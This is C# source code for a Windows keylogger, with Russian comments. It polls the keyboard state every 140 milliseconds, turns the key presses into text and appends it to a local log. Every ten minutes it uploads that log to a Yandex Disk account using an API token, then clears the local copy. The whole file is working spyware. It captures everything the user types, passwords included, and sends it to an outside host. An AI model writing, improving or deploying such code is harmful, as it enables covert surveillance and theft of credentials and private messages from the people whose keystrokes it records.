using System;
using System.Globalization;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using YandexDisk.Client.Http;


namespace keylogger
{
    static class Program
    {
        const string YaApiToken = "";
        const int MaxBufferSize = 10;

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            TimerCallback tm = new TimerCallback(Ya);
            // создаем таймер
            var timer = new System.Threading.Timer(tm, null, 0, 600000);    //раз в 10 минут
            
            KeysConverter kc = new KeysConverter();
            
            CultureInfo ci = new CultureInfo(WinApiWrapper.GetKeyboardLayout());
            var buf = $"<{ci.TwoLetterISOLanguageName}>";
            while (true)
            {

                if (!ci.Equals(new CultureInfo(WinApiWrapper.GetKeyboardLayout())))
                {
                    buf += $"</{ci.TwoLetterISOLanguageName}>" + Environment.NewLine;
                    ci = new CultureInfo(WinApiWrapper.GetKeyboardLayout());
                    buf += $"<{ci.TwoLetterISOLanguageName}>";
                    if (buf.Length > MaxBufferSize)
                    {
                        File.AppendAllText("keylogger.log", buf);
                        buf = "";
                    }
                }
                Thread.Sleep(140);                  //время на нажатие пользователем (раз в 140 мс проверяется состояние клавиатуры)
                for (int i = 0; i < 255; i++)
                {
                    int state = WinApiWrapper.GetAsyncKeyState(i);
                    if (state != (int)KeyState.Unpressed)
                    {
                        switch ((Keys)i)
                        {
                            case Keys.Space: buf += " "; continue;
                            case Keys.Enter: { buf += Environment.NewLine; continue; }
                            case Keys.Back: { if (buf.Length > 1) buf = buf.Remove(buf.Length - 1); continue; }
                            case Keys.LButton: continue;
                            case Keys.RButton: continue;
                            case Keys.MButton: continue;
                            case Keys.Oemtilde:
                                {
                                    if (IsShift()) buf += '~'; else buf += '`'; continue;
                                }
                            case Keys.OemOpenBrackets:
                                {
                                    if (IsShift()) buf += '{'; else buf += '['; continue;
                                }
                            case Keys.OemCloseBrackets:
                                {
                                    if (IsShift()) buf += '}'; else buf += ']'; continue;
                                }
                            case Keys.Oemplus:
                                {
                                    if (IsShift()) buf += '='; else buf += '+'; continue;
                                }
                            case Keys.OemMinus:
                                {
                                    if (IsShift()) buf += '_'; else buf += '-'; continue;
                                }
                            case Keys.OemSemicolon:
                                {
                                    if (IsShift()) buf += ':'; else buf += ';'; continue;
                                }
                            case Keys.OemQuotes:
                                {
                                    if (IsShift()) buf += '\"'; else buf += '\''; continue;
                                }
                            case Keys.Oemcomma:
                                {
                                    if (IsShift()) buf += '<'; else buf += ','; continue;
                                }
                            case Keys.OemPeriod:
                                {
                                    if (IsShift()) buf += '>'; else buf += '.'; continue;
                                }
                            case Keys.OemQuestion:
                                {
                                    if (IsShift()) buf += '?'; else buf += '/'; continue;
                                }
                        }
                        
                        if (((Keys)i).ToString().Length == 1) // если это буква (в енуме состоит из 1 символа)
                        {
                            buf += IsBigSymbol() ? ((Keys)i).ToString().ToUpper() : ((Keys)i).ToString().ToLower();
                        }
                        if (((Keys)i).ToString().Length == 2 && ((Keys)i).ToString()[0] is 'D')
                        {
                            switch (((Keys)i).ToString()[1])
                            {
                                case ('0'):
                                    if (IsShift()) buf += ')'; else buf += '0'; continue;
                                case ('1'):
                                    if (IsShift()) buf += '!'; else buf += '1'; continue;
                                case ('2'):
                                    if (IsShift()) buf += '@'; else buf += '2'; continue;
                                case ('3'):
                                    if (IsShift()) buf += '#'; else buf += '3'; continue;
                                case ('4'):
                                    if (IsShift()) buf += '$'; else buf += '4'; continue;
                                case ('5'):
                                    if (IsShift()) buf += '5'; else buf += '5'; continue;
                                case ('6'):
                                    if (IsShift()) buf += '^'; else buf += '6'; continue;
                                case ('7'):
                                    if (IsShift()) buf += '&'; else buf += '7'; continue;
                                case ('8'):
                                    if (IsShift()) buf += '*'; else buf += '8'; continue;
                                case ('9'):
                                    if (IsShift()) buf += '('; else buf += '9'; continue;
                                default:
                                    continue;
                            }

                        }

                        if (buf.Length > MaxBufferSize)
                        {
                            File.AppendAllText("keylogger.log", buf);
                            buf = "";
                        }
                    }
                }
            }
        }


        static bool IsBigSymbol()
        {
            var caps = Console.CapsLock;
            bool isBig = IsShift() | caps;

            return isBig;
        }
        static bool IsShift()
        {
            var shiftNumber = 16;
            short shiftState = (short)WinApiWrapper.GetAsyncKeyState(shiftNumber);
            if ((shiftState & 0x8000) == 0x8000)
            {
                return true;
            }
            return false;
        }
        

        public static void Ya(object obj)
        {
            _ = Yadisk();
        }
        static async Task Yadisk()
        {

            // объявляем ключи
            String key = YaApiToken;
            String path = "KeyLoggerLogs";
            String fl = System.Net.Dns.GetHostName()+ "_" + DateTime.Now.ToString("g") +".txt";


            // подключаемся к диску по token
            var api = new DiskHttpApi(key);

            //получаем ссылку на загрузку, указываем что можно перезаписать файл
            var link = await api.Files.GetUploadLinkAsync("disk:/" + path + "/" + fl, overwrite: false,cancellationToken: default);
            
            //открываем файл на компьютере
            using (var fs = File.OpenRead(Path.Combine(Environment.CurrentDirectory, "keylogger.log")))
            {

                //закачиваем файл
                await api.Files.UploadAsync(link, fs);
            }

            File.WriteAllText("keylogger.log","");
        }
    }

    public enum KeyState : int
    {
        Unpressed = 0
    }

    
}
